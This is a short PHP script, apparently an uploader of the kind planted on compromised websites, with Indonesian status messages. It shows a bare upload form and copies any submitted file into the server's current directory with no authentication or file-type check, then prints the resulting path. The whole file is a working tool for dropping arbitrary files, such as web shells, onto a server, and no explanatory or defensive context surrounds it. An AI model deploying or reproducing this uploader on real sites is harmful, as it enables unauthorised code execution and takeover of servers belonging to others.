<?php
echo "<form action='' enctype='multipart/form-data' method='POST'>
<input type='file' name='filena'>
<input type='submit' name='upload' value='gasken'>
</form>";
if (isset($_POST['upload'])) {
  $cwd=getcwd();
  $tmp=$_FILES['filena']['tmp_name'];
  $file=$_FILES['filena']['name'];
  if (@copy($tmp, $file)){
    echo "File berhasil terupload! => $cwd/$file";
  }
  else {
    echo "File gagal terupload :(";
  }
}__halt_compiler()
?>